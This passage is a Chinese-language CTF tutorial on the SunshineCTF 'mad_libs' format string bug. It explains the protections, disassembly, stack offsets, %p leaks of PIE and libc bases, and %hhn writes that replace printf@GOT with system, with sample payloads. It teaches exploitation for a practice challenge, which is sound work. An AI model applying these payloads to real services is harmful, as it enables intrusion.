# SunshineCTF pwn2 — `mad_libs` 格式化字串漏洞完全教學

> 這份筆記寫給「完全沒聽過 ROP / 沒寫過 pwn 題」的初學者。
> 每一個位址、每一個 offset 都是從實際檔案反組譯／用 gdb 與 `/proc/<pid>/maps` 驗證出來的，不是猜的。
> 所有指令都可以在你自己的機器上照抄執行。

---

## 0. 題目資訊

| 項目 | 值 |
|---|---|
| 題目 | `mad_libs` |
| 類型 | pwn / format string（格式化字串漏洞） |
| 遠端 | `chal.sunshinectf.games:26001` |
| 附件 | `mad_libs`、`libc.so.6`、`ld-linux-x86-64.so.2` |
| flag | `sun{f1ll_iN_th3_g0T_eNtry}` |

`mad_libs` 是一支 x86-64 ELF 執行檔，用 `file` 看：

```console
$ file mad_libs
mad_libs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
          dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
          BuildID[sha1]=91b5051029d66af2b84c86d27fac427b2d670f29,
          for GNU/Linux 3.2.0, stripped
```

* **LSB**：little-endian（低位元組存在低位址）。
* **pie executable**：可執行檔也是「位置無關」的，載入位址每次執行都不同 → 見 §2。
* **stripped**：函式符號被拔掉了，`objdump` 看不到 `main` 這個名字，只剩 `<_text+0x...>`。我們是在 `.text`（0x10e0 開始）裡手動找出 `main` 的：位址 **0x11c9**。

### 為什麼不能直接 `./mad_libs`

`readelf -dW mad_libs` 可以看到：

```
0x000000000000001d (RUNPATH)  Library runpath: [$ORIGIN]
```

也就是它要求「跟我放在同一個目錄」的 `libc.so.6`。用系統的 `/lib64/ld-linux-x86-64.so.2` 去跑會因為系統 libc 版本不同而噴 `symbol lookup error`。所以我們用附件裡的 loader 手動指定：

```console
$ ./ld-linux-x86-64.so.2 --library-path . ./mad_libs
```

> 本機沒有 `pwninit` 也沒關係，上面這行就是最簡單的「用題目給的 libc 跑」的方法。
> pwntools 寫成：`process(['./ld-linux-x86-64.so.2','--library-path','.','./mad_libs'])`。
> **不要 patch 執行檔**，`patchelf` 會改到 ELF，容易把 offset 弄壞。

---

## 1. 保護機制（checksec）是什麼、對這題有什麼影響

```
$ readelf -hW mad_libs | grep Type        # → DYN  → PIE
$ readelf -lW mad_libs | grep GNU_STACK   # → RW   → NX enabled
$ readelf -lW mad_libs | grep GNU_RELRO   # → 0x3da8 ~ 0x4000
$ readelf -dW mad_libs | grep BIND_NOW    # → 沒有 → Partial RELRO
```

### (1) NX (No-eXecute，不可執行堆疊)

`GNU_STACK ... RW` 代表堆疊只有讀寫權限，沒有執行權限。
**影響**：不能把 shellcode 打進 stack 上再跳過去執行。想執行 shellcode 就得靠 `mprotect` 之類的手法，太麻煩。所以我們的目標是「呼叫 libc 裡已經寫好的 `system()`」，而不是自己塞程式碼。

### (2) Canary（金絲雀／堆疊保護）

`main` 一開始會把 `fs:0x28`（每個執行緒的 TLS 裡的一個隨機值）存到 `[rbp-8]`；函式結束前再比對一次，不一樣就呼叫 `__stack_chk_fail` 自殺。

**影響**：任何「覆蓋到 return address 的堆疊溢出」都會被偵測到。但是！這題 `fgets(buf, 0x100, stdin)` 的 size 是 256（`123e: mov esi,0x100`），`fgets` 最多讀 **255 (0xFF) 個字元**再補一個 `'\0'`，所以最高只寫到 `buf[255]`（= `rbp-0x11`），離 `rbp-8` 的 canary 還有 8 bytes。所以：

> **這題沒有堆疊溢出，canary 其實是打醬油的。** 唯一的洞是 `printf(buf)`。
> （我們還是會把 canary 洩漏出來，一方面是教學示範，另一方面是驗證我們對堆疊配置的理解正確。）

### (3) PIE (Position Independent Executable，位置無關執行檔)

整個執行檔被當成 shared library 載入，每次執行的 base 都不同 → 所有「程式碼位址」和「GOT 位址」都是 `PIE_base + 固定 offset`。

**影響**：我們想寫 `printf@GOT`（= `PIE_base + 0x4010`），就**必須先洩漏 PIE_base**。

⚠️ **非常重要**：絕對不可以假設「PIE 跟 libc 的距離是固定的」。
實測（見 §5）本機兩者差距會變（`0x332000`、`0x333000`、`0x39a000`…），而**遠端 `mad_libs` 在 `0x5d...`、libc 在 `0x74...`，差距更是天差地遠**：

```
[*] libc leak   = 0x74c6d28001ca  -> libc base = 0x74c6d27d6000
[+] main leak   = 0x5deeff4bb1c9  -> PIE  base = 0x5deeff4ba000
```

所以 libc base 和 PIE base **要各洩漏一次**。

### (4) Partial RELRO

`GNU_RELRO` 覆蓋 `0x3da8 ~ 0x4000`（`.init_array`、`.fini_array`、`.got`）。
`.got.plt` 從 **0x3fe8** 到 **0x4028**，**沒有**被 RELRO 保護到。

**影響**：**GOT 表可以寫！** 這是這題的關鍵。如果是 Full RELRO（`BIND_NOW`），GOT 會被改成唯讀，這條路就死了。

### 小結：這題唯一的路 = 用 format string 改 GOT

| 保護 | 狀態 | 對解題的影響 |
|---|---|---|
| NX | 開 | 不能執行 stack 上的 shellcode → 改去 call `system` |
| Canary | 開 | 但沒有溢出，無影響 |
| PIE | 開 | **必須洩漏 PIE base** 才知道 GOT 的絕對位址 |
| RELRO | Partial | **GOT 可寫** → 可以把 `printf` 換成 `system` |

---

## 2. 逐行組語解說（`objdump -d -M intel`）

### 2.1 先補基礎：x86-64 呼叫慣例（System V ABI）

函式呼叫時，**前 6 個整數／指標參數**依序放在這些暫存器：

| 參數順序 | 暫存器 |
|---|---|
| 第 1 個 | `rdi` |
| 第 2 個 | `rsi` |
| 第 3 個 | `rdx` |
| 第 4 個 | `rcx` |
| 第 5 個 | `r8` |
| 第 6 個 | `r9` |
| 第 7 個以後 | 放在**堆疊**上（caller 事先 push 好） |

* 回傳值放 **`rax`**。
* **`rsp`** = Stack Pointer，永遠指向堆疊頂端（最低位址）。
* **`rbp`** = Base Pointer，這個函式的「框底」，用它 + 負偏移來存取區域變數。
* `rdi/rsi/rdx/rcx/r8/r9/rax` 是 **caller-saved**：被呼叫的函式可以隨便改。
* `rbx/rbp/r12~r15` 是 **callee-saved**：被呼叫的函式要負責還原。

常用指令：

| 指令 | 意思 |
|---|---|
| `push rbp` | `rsp -= 8`，然後把 `rbp` 的值寫到 `[rsp]` |
| `pop rbp` | 把 `[rsp]` 讀進 `rbp`，然後 `rsp += 8` |
| `mov dst, src` | 複製（src 不動） |
| `lea dst, [base+off]` | **只算位址**（Load Effective Address），不做記憶體讀取。`lea rax,[rbp-0x110]` = 把「`rbp-0x110` 這個數字」放進 `rax`（就是 `rax = &buf`） |
| `call f` | `push 下一行的位址`（返回位址）然後跳到 `f` |
| `ret` | `pop rip`：把 `[rsp]` 彈進指令指標，回到 caller |
| `leave` | 等於 `mov rsp, rbp` + `pop rbp`（拆掉這個函式的框） |
| `sub rsp, 0x120` | 在堆疊上「保留」0x120 位元組給區域變數 |
| `test rax, rax` | 做 AND 但只設旗標；`test rax,rax` + `je` = 「如果 rax == 0 就跳」 |
| `cmp a, b` | 算 `a - b` 只設旗標；`jle` = 「（**有號**）小於等於就跳」，`ja` = 「（**無號**）大於就跳」（有號/無號判斷不同，見 `wp/00_基礎知識_從零開始.md` §5.2） |
| `mov eax, 0` | 把 `rax` 清 0。**對 variadic 函式（如 printf）非常重要**：代表「沒有用到 SSE 向量參數」 |

### 2.2 `_start`（0x10e0）— 程式真正的入口

```
    10e0: f3 0f 1e fa          endbr64
    10e4: 31 ed                 xor    ebp,ebp
    10e6: 49 89 d1              mov    r9,rdx
    10e9: 5e                    pop    rsi                      ; rsi = argc
    10ea: 48 89 e2              mov    rdx,rsp                  ; rdx = argv
    10ed: 48 83 e4 f0           and    rsp,0xfffffffffffffff0   ; 16-byte 對齊
    10f1: 50                    push   rax
    10f2: 54                    push   rsp
    10f3: 45 31 c0              xor    r8d,r8d                  ; r8  = 0 (fini)
    10f6: 31 c9                 xor    ecx,ecx                  ; rcx = 0 (init)
    10f8: 48 8d 3d ca 00 00 00  lea    rdi,[rip+0xca]           ; rdi = 0x11c9 = main  ← 關鍵！
    10ff: ff 15 bb 2e 00 00     call   QWORD PTR [rip+0x2ebb]   ; call __libc_start_main
    1105: f4                    hlt
```

`lea rdi,[rip+0xca]` 的目標是 **0x11c9**，這就是 `main` 的位址（`rip` 相對定址：`0x10ff + 7 + 0xca = 0x11c9`）。
**記住這個 0x11c9**：這個指標會被傳進 `__libc_start_main`，後來我們能在堆疊上把它洩漏出來（第 47 個參數）。

### 2.3 `main`（0x11c9）— 逐行

```
    11c9: f3 0f 1e fa           endbr64
    11cd: 55                     push   rbp
    11ce: 48 89 e5               mov    rbp,rsp
    11d1: 48 81 ec 20 01 00 00   sub    rsp,0x120
    11d8: 64 48 8b 04 25 28 00 00 00   mov  rax,QWORD PTR fs:0x28
    11e1: 48 89 45 f8            mov    QWORD PTR [rbp-0x8],rax
    11e5: 31 c0                  xor    eax,eax
```

* `push rbp; mov rbp,rsp` → 建立新的堆疊框（standard prologue）。
* `sub rsp,0x120` → 保留 0x120 bytes 給區域變數。
* `mov rax,QWORD PTR fs:0x28` → 讀 TLS 的 canary。
* `mov [rbp-0x8],rax` → **canary 存在 `[rbp-0x8]`**。
* `xor eax,eax` → `rax = 0`。

```
    11e7: 48 8d 05 16 0e 00 00   lea    rax,[rip+0xe16]        # 2004
    11ee: 48 89 c7               mov    rdi,rax
    11f1: e8 9a fe ff ff         call   1090 <puts@plt>
    11f6: 48 8d 05 18 0e 00 00   lea    rax,[rip+0xe18]        # 2015
    11fd: 48 89 c7               mov    rdi,rax
    1200: e8 8b fe ff ff         call   1090 <puts@plt>
```

兩次 `puts`（`rdi` = 字串位址，符合呼叫慣例）：

```console
$ objdump -s -j .rodata mad_libs
 2000 01000200 3d3d3d20 4d616420 4c696273  ....=== Mad Libs
 2010 203d3d3d 0046696c 6c20696e 20746865   ===.Fill in the
 2020 20626c61 6e6b7321 00282564 29203e20   blanks!.(%d) >
 2030 0053746f 72792063 6f6d706c 65746521  .Story complete!
```

* 0x2004 = `"=== Mad Libs ==="`
* 0x2015 = `"Fill in the blanks!"`
* 0x2029 = `"(%d) > "`  ← 格式化字串
* 0x2031 = `"Story complete!"`

```
    1205: c7 85 ec fe ff ff 00 00 00 00   mov DWORD PTR [rbp-0x114],0x0
    120f: eb 5a                jmp    126b                 ; 跳到迴圈條件
```

**迴圈計數器 `i` 存在 `[rbp-0x114]`（4 bytes）**，初始化為 0。

```
    1211: 8b 85 ec fe ff ff     mov    eax,DWORD PTR [rbp-0x114]  ; eax = i
    1217: 83 c0 01               add    eax,0x1                    ; eax = i+1
    121a: 89 c6                  mov    esi,eax                    ; ★ 參數2 = i+1
    121c: 48 8d 05 06 0e 00 00   lea    rax,[rip+0xe06]            ; 0x2029 = "(%d) > "
    1223: 48 89 c7               mov    rdi,rax                    ; ★ 參數1 = 格式字串
    1226: b8 00 00 00 00         mov    eax,0x0
    122b: e8 80 fe ff ff         call   10b0 <printf@plt>          ; printf("(%d) > ", i+1)
```

`esi` 放 `i+1`、`rdi` 放 `"(%d) > "`，這完全符合呼叫慣例（第 1 參數 `rdi`、第 2 參數 `esi`）。

> 這個 **`printf@plt` 呼叫就是我們之後要劫持的目標**：把 GOT 裡的 printf 換成 system 之後，這行會變成 `system("(%d) > ")`。

```
    1230: 48 8b 15 19 2e 00 00  mov    rdx,QWORD PTR [rip+0x2e19]  # 4050 <stdin>
    1237: 48 8d 85 f0 fe ff ff  lea    rax,[rbp-0x110]             ; rax = &buf
    123e: be 00 01 00 00        mov    esi,0x100                   ; size = 256
    1243: 48 89 c7              mov    rdi,rax                     ; dst  = buf
    1246: e8 75 fe ff ff        call   10c0 <fgets@plt>            ; fgets(buf,0x100,stdin)
    124b: 48 85 c0              test   rax,rax
    124e: 74 26                 je     1276                        ; 讀不到 (EOF) 就跳出
```

* `rdx` 從 GOT 讀 `stdin`（`stdin` 是 COPY relocation，本體在 `mad_libs` 的 `.bss` 0x4050）。
* **`buf` 在 `[rbp-0x110]`，長度 0x100。** 這行 `lea rax,[rbp-0x110]` 就是 `&buf`。
* `fgets` 讀到換行就停，所以我們**不能送 `\n`（0x0a）在 payload 中間**。

```
    1250: 48 8d 85 f0 fe ff ff  lea    rax,[rbp-0x110]             ; rax = &buf
    1257: 48 89 c7              mov    rdi,rax                     ; rdi = &buf
    125a: b8 00 00 00 00        mov    eax,0x0                     ; 沒有向量參數
    125f: e8 4c fe ff ff        call   10b0 <printf@plt>           ; ★★★ printf(buf) ★★★
```

> 🚨 **這就是漏洞本體**：`rdi = &buf`（使用者輸入），而 `printf` 是 variadic 函式，它會把 `rdi` 當成**格式字串**來解析！
> 正確寫法應該是 `printf("%s", buf)`。

```
    1264: 83 85 ec fe ff ff 01   add    DWORD PTR [rbp-0x114],0x1   ; i++
    126b: 83 bd ec fe ff ff 07   cmp    DWORD PTR [rbp-0x114],0x7
    1272: 7e 9d                  jle    1211                        ; i <= 7 就繼續
    1274: eb 01                  jmp    1277
    1276: 90                     nop                                ; fgets 失敗時跳來這
    1277: 48 8d 05 b3 0d 00 00   lea    rax,[rip+0xdb3]             # 2031
    127e: 48 89 c7               mov    rdi,rax
    1281: e8 0a fe ff ff         call   1090 <puts@plt>             ; puts("Story complete!")
    1286: b8 00 00 00 00         mov    eax,0x0
    128b: 48 8b 55 f8            mov    rdx,QWORD PTR [rbp-0x8]     ; rdx = 存回的 canary
    128f: 64 48 2b 14 25 28 00 00 00  sub rdx,QWORD PTR fs:0x28    ; 跟 TLS 的比
    1298: 74 05                  je     129f
    129a: e8 01 fe ff ff         call   10a0 <__stack_chk_fail@plt> ; 不一樣就爆炸
    129f: c9                     leave
    12a0: c3                     ret
```

**迴圈是 `i = 0..7` → 總共 8 次**（`cmp ...,0x7` + `jle`）。這是我們全部的「開火次數」。
最後 `leave; ret` 回到 `__libc_start_call_main`。

### 2.4 `setvbuf` 初始函式（0x12a1，由 `.init_array` 呼叫）

```
    12a1: ... 
    12d5: e8 f6 fd ff ff         call   10d0 <setvbuf@plt>   ; setvbuf(stdout, NULL, 2, 0)
    12f3: e8 d8 fd ff ff         call   10d0 <setvbuf@plt>   ; setvbuf(stderr, NULL, 2, 0)
```

`_IONBF = 2` → **stdout / stderr 都是「無緩衝」**。
**好處**：我們的 leak 和輸出會**立刻**送到 socket，不需要等 flush。做 format string 題時這很重要，否則 `%p` 的結果會卡在緩衝區裡。

### 2.5 完整堆疊框圖（main）

`printf(buf)` 執行到 `call 10b0 <printf@plt>`（0x125f）那一刻，`rsp = rbp-0x120`：

```
   位址大 (高位址)
   ┌───────────────────────────────────────────────────────────┐
   │ … 初始堆疊 argc / argv / envp / auxv …                    │
   ├───────────────────────────────────────────────────────────┤
   │ __libc_start_call_main 的框                               │
[rbp+0x28] │  ← 第 47 個可讀參數 = main 位址 (PIE+0x11c9)      │
   │                                                           │
[rbp+0x10] │  ← 第 44 ~ 46 個參數                              │
[rbp+0x08] │  ← 第 43 個參數：main 的返回位址                  │  = libc + 0x2a1ca
[rbp+0x00] │  ← 第 42 個參數：saved rbp (caller 的 rbp)        │  指向 stack
[rbp-0x08] │  ← 第 41 個參數：stack canary                     │  結尾一定是 0x00
[rbp-0x10] │  ← 第 40 個參數：(8 bytes 未用填充)               │
[rbp-0x11] │    ↑ buf 結尾 (buf[0xff] + NUL)                   │
   │                                                           │
[rbp-0x110]│  ← 第 8 個參數：char buf[0]   ★我們輸入的開頭★    │
   │     char buf[0x100]  共 32 個 8-byte slot                 │
   │     (第 8 ~ 第 39 個參數)                                 │
[rbp-0x18] │  ← 第 39 個參數：buf[248..255]                    │
[rbp-0x118]│  ← 第 7 個參數：(低位殘留 : 高位=i)  ← 不是輸入！ │
[rbp-0x114]│     int i (4 bytes)  ← 迴圈計數器                 │
[rbp-0x120]│  ← 第 6 個參數：(未初始化殘留) = rsp 底部         │
   └───────────────────────────────────────────────────────────┘
   位址小 (低位址)
```

* `buf` 佔 `rbp-0x110` ~ `rbp-0x0F`（0x100 bytes = slot 8 ~ 39）。
* **`buf[8k]` = 第 `8+k` 個參數**（k = 0,1,2,…）。
* slot 40 = `rbp-0x10`、slot 41 = canary、slot 42 = saved rbp、slot 43 = return address。

### 2.6 PLT / GOT：`printf@plt` 到底怎麼跑

**GOT（Global Offset Table）**：放在 data 段的一張「函式位址表」，載入後由動態連結器填上真正的位址。
**PLT（Procedure Linkage Table）**：一小段程式碼，負責「去 GOT 拿位址然後跳過去」。

```
    10b0 <printf@plt>:                 ; .plt.sec 裡的入口（程式呼叫的目標）
    10b0: f3 0f 1e fa     endbr64
    10b4: ff 25 56 2f 00 00  jmp QWORD PTR [rip+0x2f56]   # → 0x4010 (printf@GOT)
    10ba: 0f 1f 44 00 00   nop
```

執行流程：

1. `main` 執行 `call 10b0` → 跳進 `printf@plt`。
2. `jmp QWORD PTR [0x4010]`：**去讀 GOT 裡的 8 bytes 然後跳過去**。
3. **第一次**呼叫時，GOT 裡放的還是「lazy binding stub」的位址（用 `objdump -s -j .got.plt` 可以看到初始值是 `0x1050`）：

   ```
   3fe8 c03d0000 00000000 00000000 00000000   ; 0x3fe8=GOT[0]=_DYNAMIC
   3ff8 00000000 00000000 30100000 00000000   ; 0x3ff8=GOT[2]=resolver, 0x4000=0x1030(puts)
   4008 40100000 00000000 50100000 00000000   ; 0x4008=0x1040(ssp fail), 0x4010=0x1050(printf)
   4018 60100000 00000000 70100000 00000000   ; 0x4018=0x1060(fgets),   0x4020=0x1070(setvbuf)
   ```

   跳到 0x1050 後會 `push 2` 並跳去 resolver（0x1020），resolver 找到真正的 `printf` 後**把位址寫回 GOT 0x4010**，之後就直接跳了。
4. 所以等我們開始攻擊時，`[0x4010]` 已經是真正的 `printf` 位址（實測 = libc+0x600f0）：

   ```
   printf@GOT before write: 0x7f59a72600f0  (libc printf = 0x7f59a72600f0)
   ```

**GOT 的各個位置（本題）**：

| GOT 位址 | 內容 |
|---|---|
| 0x4000 | `puts` |
| 0x4008 | `__stack_chk_fail` |
| **0x4010** | **`printf`** ← 我們要改這個 |
| 0x4018 | `fgets` |
| 0x4020 | `setvbuf` |

Partial RELRO 只保護到 0x4000，所以 **0x4010 可以寫**。

---

## 3. 漏洞原理：格式化字串（format string）是什麼

### 3.1 一句話

`printf` 的第一個參數是**格式字串**，裡面 `%` 開頭的東西會被當成「指令」。
`printf(buf)` 讓使用者決定格式字串 → 使用者就能：
1. **讀**任意堆疊內容（`%p`、`%s`）→ 洩漏位址；
2. **寫**任意記憶體（`%n`）→ 改 GOT。

### 3.2 `%p` 與 `%N$p`：從堆疊讀值

* `%p` 會把「下一個 variadic 參數」當成指標印出來。
* `%N$p` 是「直接指定第 N 個參數」（**positional argument**），不用一直 `%p` 消耗。

**為什麼第 6 個之後的參數在堆疊上？**
因為前 5 個整數參數照 ABI 放在 `rsi, rdx, rcx, r8, r9`（`rdi` 被格式字串用掉了）。glibc 的 `printf` 進入點會把這 5 個暫存器**存進自己的 register save area**，第 6 個之後就從堆疊（`rsp+8`，也就是跳過返回位址後的第一格）往上數。

**為什麼 `buf[0]` 剛好是第 8 個？**
`printf(buf)` 的 `call` 發生在 `rsp = rbp-0x120` 時。`call` 把返回位址推到 `rbp-0x128`，於是 printf 的「堆疊參數區」從 `rbp-0x120` 開始：

| 參數 | 位址 | 內容 |
|---|---|---|
| 1 ~ 5 | `rsi,rdx,rcx,r8,r9` | 上一次呼叫留下的殘值（`fgets` 的殘渣） |
| 6 | `rbp-0x120` | 未初始化殘留 |
| 7 | `rbp-0x118` | 低 4 bytes 殘留 + 高 4 bytes = 迴圈計數器 `i` |
| **8** | **`rbp-0x110`** | **`buf[0]` ← 我們的輸入** |

所以：**`buf[8k]` → 第 `(8+k)` 個參數**。

> ⚠️ 很多人第一次會猜 `%6$p`（因為前面 5 個是暫存器）。**這題是 `%8$p`**，而 `%6$p`/`%7$p` 印出來的是殘留垃圾。
> **絕對不要用猜的**——§4 教你怎麼實測。

### 3.3 實測驗證（真的做了，不是推論）

送 `AAAABBBB` + 印出第 1~46 個參數：

```
pos   1: 0x555555b9d2a1          ← heap 殘留（不是我們的）
pos   2: 0xfbad2088              ← _IO_FILE flags 殘留
pos   3: 0x7f
pos   4: 0x555555b9d387          ← heap 殘留
pos   5: (nil)
pos   6: 0x2                     ← rbp-0x120：上一次呼叫留下的垃圾（跟 i 無關）
pos   7: 0xe                     ← rbp-0x118：低 4 bytes 是殘留（0xe）、高 4 bytes 是 i = 0
pos   8: 0x4242424241414141      ← ★ "AAAABBBB" little-endian = buf[0] ★
pos   9: 0x2432257c70243125      ← "%1$p|%2$"
...
pos  40: 0x7ffc558b43c0          ← rbp-0x10（填充）
pos  41: 0xaccc1e4eb8b48b00      ← canary
pos  42: 0x7ffc558b4440          ← saved rbp
pos  43: <libc 返回位址>
```

> 上面 pos 1、3、4、6、7 都是「別的東西的殘留」，**每次執行都可能不同**（我實測也拿過 `(nil)`、`0x100000`、`0x40`）。
> 唯一穩定不變的是 **pos 8 = 你輸入的前 8 bytes**。
> ⚠️ `0xe` **不是** `i`：`printf(buf)` 跑在**第一次迴圈**，此時 `i` 才剛被設成 0
> （`1205: mov DWORD PTR [rbp-0x114],0x0`），所以 pos 7 的高 4 bytes 一定是 `0`。
> `i` 存在 `[rbp-0x114]`，也就是 pos 7 的**高半部**，而 `i` 只會是 0~7。pos 6（`rbp-0x120`）跟 `i` 完全無關。

再用 `/proc/<pid>/maps` 對照實際載入位址，跨多次執行都一致：

```
=== PIE=0x7fdc7bf32000 LIBC=0x7fdc7bc00000 (PIE-LIBC=0x332000)
   pos 43: 0x7fdc7bc2a1ca  LIBC+0x2a1ca      ← main 的返回位址
   pos 47: 0x7fdc7bf331c9  PIE+0x11c9        ← main 的位址！
   pos 59: 0x7fdc7bf332f8  PIE+0x12f8
   pos 67: 0x7fdc7bf331c9  PIE+0x11c9        ← 又一次 main
   pos 70: 0x7fdc7bf330e0  PIE+0x10e0        ← _start
   pos 75: 0x7fdc7bf33105  PIE+0x1105        ← _start 裡 call 的返回位址
=== PIE=0x7ff047f33000 LIBC=0x7ff047c00000 (PIE-LIBC=0x333000)
   pos 43: 0x7ff047c2a1ca  LIBC+0x2a1ca
   pos 47: 0x7ff047f341c9  PIE+0x11c9
=== PIE=0x7f7b2d79a000 LIBC=0x7f7b2d400000 (PIE-LIBC=0x39a000)   ← 注意差距會變！
   pos 43: 0x7f7b2d42a1ca  LIBC+0x2a1ca
   pos 47: 0x7f7b2d79b1c9  PIE+0x11c9
```

### 3.4 `%n` / `%hn` / `%hhn`：任意位址寫入

**計數器（counter）怎麼算？** `printf` 內部有一個「到目前為止輸出了幾個字元」的計數器，`%n` 就是把這個數字寫出去。

* 每個 `%c` / `%<寬度>c` 貢獻它的填充長度（`%64c` → +64）；
* 格式字串裡**不是格式指令**的裸字元貢獻 1 個 / 字元（對齊用的 `aaaaba` → +6）；
* **格式指令本身不會被印出來、不貢獻任何字元**（`%17$hhn` 貢獻 0；`%64c` 只貢獻 64，不是 64+4）。

所以 `%64c%17$hhn` 執行到 `%17$hhn` 那一刻的計數是 **64**。

`%n` **不是印東西**，而是「把目前為止已經印出的字元數寫進對應的指標參數」：

| 指令 | 寫入大小 |
|---|---|
| `%n` | 4 bytes（int） |
| `%hn` | 2 bytes（short） |
| `%hhn` | 1 byte（char） |

**怎麼寫任意值到任意位址？**

1. `%n` 需要「一個指標參數」。我們無法直接控制暫存器，但**可以控制 `buf` 的內容**，而 `buf[8k]` 就是第 `8+k` 個參數！
2. 所以把「目標位址」用小端序寫在 `buf` 裡，假設落在第 17 個參數，就用 `%17$hhn` 去寫 `*(char*)該位址`。
3. 要寫的值 = 「印出的字元數」。用 `%<寬度>c` 把計數撐到目標值即可。

> ★ **一句話抓住這裡的關鍵：控制 `buf` ＝ 控制參數（而且是「指標」與「值」兩者都控制）。**
>
> 很多新手卡在「參數不是呼叫端 `printf("...", a, b)` 傳進去的嗎？為什麼我寫在 buffer 裡也算參數？」
> ——因為 `printf` **無從檢查**那些值「是不是真的參數」：它只是**照著編號，去固定的地方
> （暫存器 + 呼叫者的堆疊）取 8 bytes 當參數用**。而我們那塊 `char buf[...]` 就躺在
> **`printf` 呼叫者的堆疊上**，剛好落在「第 6 個參數以後」的區域裡。
>
> 所以對 `printf(buf)` 這種題目：
>
> | 我們控制的東西 | 它同時是… | 效果 |
> |---|---|---|
> | `buf` 裡的**位址**（小端 8 bytes） | `printf` 眼中的「第 N 個參數」 | `%N$hhn` 會把值寫到**那個位址** |
> | `buf` 裡的**格式指令**（`%64c%17$hhn`） | `printf` 眼中的「格式字串」 | 決定**要寫的值**（＝印出的字元數） |
>
> 也就是說：**格式字串本身就是那塊 buffer** —— 攻擊者一手交「指令」、一手交「參數」，
> 兩者都在同一塊自己完全控制的記憶體裡。這就是 format string 能變成「任意位址任意寫入」的原因。
> （`pwn2` 這題還多一層方便：程式自己會把 `printf` 的參數準備好幾個，
> 所以我們只要知道自己的 buffer 是第幾個參數就好 —— §4 的四個技巧就是在量這個編號。）

例如要寫 byte `0x40` 到 `[0x4010]`：

```
%64c%17$hhn     ← 先印 64 個字元（計數 = 64 = 0x40），再寫進第 17 個參數指向的位址
```

**要寫一個 6 bytes 的 libc 位址（如 `system`）**，有兩種切法：

* `write_size='short'`：**原則上**切成 3 個 2-bytes → 3 個 `%hn`，需要 3 個指標（24 bytes 位址）。
* `write_size='byte'`：**原則上**以 1-byte 為單位切 → 6 個寫入。
  ⚠️ 但 `fmtstr_payload` 的 `write_size_max` **預設是 `'long'`**，它會把相鄰 byte **自動合併**成 `%hn`（2 bytes）或 `%n`（4 bytes）以縮短格式字串。所以實跑時你可能看到 `%17$n`（本機實測）或 `%1097c%19$hn`（遠端實測，填充 1097 個字元），**不是**固定的「6 個 `%hhn`」。
  想要保證「只用 `%hhn`、填充絕不超過 255」要另外寫 `write_size_max='byte'`。兩種寫法都能拿到 flag，但要知道差別。

**本題選 `byte`**，因為：
* 6 個 `%hhn` 需要 6 個指標（48 bytes 位址），總長約 120 bytes，**遠小於 `fgets` 的 255 上限**；
* `%hhn` 單次最多只需要 255 個填充字元（若被合併成 `%hn` 就可能到 65535，實測遠端那次是 1097，很吵但完全無害 —— exploit 只是把它 drain 掉）。

> 小結：**不要以為 `write_size='byte'` 就一定產生 6 個 `%hhn`。** 想確認就跑
> `fmtstr_payload(8, {addr: value}, write_size='byte', numbwritten=0, badbytes=b'\n')` 把結果印出來看，
> 或明確加上 `write_size_max='byte'`。**重點是 `len(payload) <= 0xFF` 且不含 `\n`。**

**實際 payload 範例之一（遠端某次執行，那次剛好 6 個 byte 都沒被合併）**：

```
%64c%17$hhn%52c%18$hhn%14c%19$hhn%68c%20$hhn%12c%21$hhn%21c%22$hhnaaaaba
\x10\xe0K\xff\xee]\x00\x00     ← 第 17 個參數：&printf@GOT       (=0x5deeff4be010)
\x15\xe0K\xff\xee]\x00\x00     ← 第 18 個參數：&printf@GOT+5     (先寫最大的 byte)
\x12\xe0K\xff\xee]\x00\x00     ← 第 19 個參數：&printf@GOT+2
\x14\xe0K\xff\xee]\x00\x00     ← 第 20 個參數：&printf@GOT+4
\x13\xe0K\xff\xee]\x00\x00     ← 第 21 個參數：&printf@GOT+3
\x11\xe0K\xff\xee]\x00\x00     ← 第 22 個參數：&printf@GOT+1
```

**但位址是 ASLR 抽出來的，所以「哪幾個 byte 被合併」每次都不一樣。** 其他實測輸出：

```
[*] write payload (96 bytes): b'%64c%15$hhn%63c%16$hhn%8c%17$n%58c%18$hhn%4c%19$hhnaaaab...'    ← 含 %17$n（4-byte 合併）
[*] write payload (96 bytes): b'%64c%15$hhn%51c%16$hhn%36c%17$hhn%7c%18$hhn%1097c%19$hna...'   ← 含 %1097c%19$hn（2-byte 合併）
```

（我自己最近跑的兩次 —— 本機、遠端各一次 —— 都剛好是 **112 bytes、6 個 `%hhn`**。可見這真的每次不同。）

所以「payload 有幾個 `%hhn`、幾個 bytes、會不會出現 `%n`/`%hn`」**不固定**；
不變的是「**`len(payload) <= 0xFF` 且不含 `\n`**」這個可用性條件（exploit 就是檢查這兩點）。

* `aaaaba` 是**對齊填充**：讓「格式指令區」的長度剛好是 **72 bytes**（66 bytes 指令 + 6 bytes `aaaaba`），
  這樣第一個位址才落在 8-byte 邊界上。
* 一般式：`buf[0..7]` = 參數 8、`buf[8..15]` = 參數 9、… 也就是 **`buf[8k]` = 參數 `8+k`**。
  第一個位址在 `buf[72]` → `72/8 = 9` → 參數 `8+9 = **17**`。（注意：是 `buf[72]`，不是 `buf[64]`！）
  **如果格式指令區的長度不是 8 的倍數，第一個位址就會落在「半個 slot」上 → `%17$hhn` 讀到的是「半個位址 + 半個別的東西」→ 寫到錯誤的地方 → segfault。** 這種對齊務必用工具算，不要手算。（`fmtstr_payload` 會自動幫你補。）
* 想自己檢查長度：`python3 -c "p=b'%64c%17\$hhn%52c%18\$hhn%14c%19\$hhn%68c%20\$hhn%12c%21\$hhn%21c%22\$hhnaaaaba'; print(len(p), len(p)//8, 8+len(p)//8)"` → `72 9 17`。
* 一連串寫入的**順序**是 pwntools 排好的：它會讓計數**只增不減**（所以每個 `%<寬度>c` 的寬度都是「差值」），不需要繞回。
* 位址區裡的 `\x00` 會讓 `printf` **在那裡停住**——但所有 `%hhn` 都在那之前執行完了，所以完全沒問題（這是把位址放**最後**的標準理由）。

---

## 4. 用 `%N$p` 暴力找 offset 的實用技巧（教學用）

### 技巧 A：標記法（本題用這招）

在 payload 開頭放一個**好認的 8 bytes 標記**，例如 `AAAABBBB`（= `0x4242424241414141`），後面接一串 `%N$p`：

```
AAAABBBB|%1$p|%2$p|...|%46$p
```

哪一個 `%N$p` 印出 `0x4242424241414141`，**`buf[0]` 就是第 N 個參數**。本題答案 = **8**。

```python
fmt = b'AAAABBBB' + b'|'.join(b'%%%d$p' % i for i in range(1, 47))
# → 找出等於 0x4242424241414141 的那一個
```

### 技巧 B：`FmtStr` 自動找

